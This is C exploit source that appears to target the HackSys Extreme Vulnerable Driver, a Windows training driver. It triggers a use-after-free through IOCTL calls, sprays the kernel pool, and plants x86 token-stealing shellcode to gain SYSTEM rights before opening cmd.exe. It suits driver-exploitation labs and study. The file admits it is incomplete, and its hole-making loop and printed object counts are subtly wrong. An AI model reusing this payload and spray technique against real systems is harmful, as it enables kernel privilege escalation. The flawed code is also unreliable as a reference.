// Basic Principle: 1) Allocate the use-after-free object
//					2) Free the use-after-free object
//					3) Allocate the fake use-after-free object
//					4) Use the fake user-after-free object


// THIS CODE IS NOT COMPLETE!
#include <Windows.h>
#include <stdio.h>

#define IOCTL_ALLOCATE_UAF_OBJECT 0x222013
#define IOCTL_FREE_UAF_OBJECT 0x22201B
#define IOCTL_USE_UAF_OBJECT 0x222017
#define IOCTL_ALLOCATE_FAKE_OBJECT 0x22201F

#define BUFFER_SIZE 0x58

#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

char reserveObjects[10000];

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI* _NtAllocateReserveObject)(
    OUT PHANDLE hObject,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN DWORD ObjectType);

int main(int argc, char** argv)
{
    HANDLE handles[10000] = { 0 };
    HANDLE hReserveObj = NULL;

    HMODULE module = LoadLibraryA("ntdll.dll");
    if (!module) 
    {
        printf("[-] Failed to load the ntdll.dll library.");
        getchar();
        return 0;
    }
    printf("[+] Loaded the ntdll.dll library.");
    _NtAllocateReserveObject NtAllocateReserveObject = (_NtAllocateReserveObject)GetProcAddress(module, "NtAllocateReserveObject");

    HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == -1)
    {
        printf("\n[-] Failed to obtain a handle.");
        getchar();
        return 0;
    }
    printf("\n[+] Obtained a handle.");

    PHANDLE result;
    for (int i = 0; i < 10000; i++)
    {
        result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hReserveObj, NULL, 1);
        if (result == 0)
        {
            handles[i] = hReserveObj;
        }
    }
    printf("\n[+] Sprayed 30,000 IoCompletionReserve objects.");

    for (int i = 0; i < 10000; i++)
    {
        if ((i / 2) != (int)i)
        {
            CloseHandle(handles[i]);
        }
    }
    printf("\n[+] Created 15,000 holes.");

    DeviceIoControl(hDriver, IOCTL_ALLOCATE_UAF_OBJECT, NULL, 0, NULL, 0, NULL, NULL);
    printf("\n[+] Allocated the UAF object.");

    DeviceIoControl(hDriver, IOCTL_FREE_UAF_OBJECT, NULL, 0, NULL, 0, NULL, NULL);
    printf("\n[+] Freed the object.");

    char shellcode[66] = {
    "\x60" // PUSHAD
    "\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
    "\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
    "\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
    "\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
                               // #---[Copy System PID token]
    "\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
    "\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
    "\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
    "\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
    "\x75\xED" // jnz                                          -> |
    "\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
    "\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
                               //#---[Recover]
    "\x61" // popad
    "\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
    "\xC3" // RET 
    };

    LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
    LPVOID pointer = &shellcodeAddress;
    byte inBuffer[0x58] = { 0 };
    memcpy(inBuffer, pointer, 4);
    memset(inBuffer + 4, '\x42', 0x54);
    memset(inBuffer + 0x57, '\x00', 1);

    for (int i = 0; i < 5000; i++)
    {
        DeviceIoControl(hDriver, IOCTL_ALLOCATE_FAKE_OBJECT, inBuffer, sizeof(inBuffer), NULL, 0, NULL, NULL);
    }
    printf("\n[+] Allocated 15,000 fake objects.");

    DeviceIoControl(hDriver, IOCTL_USE_UAF_OBJECT, NULL, 0, NULL, 0, NULL, NULL);
    printf("\n[+] Used the fake object.");

    system("C:\\Windows\\System32\\cmd.exe");
    printf("\n[+] Launched a shell.");

    getchar();
	return 1;
}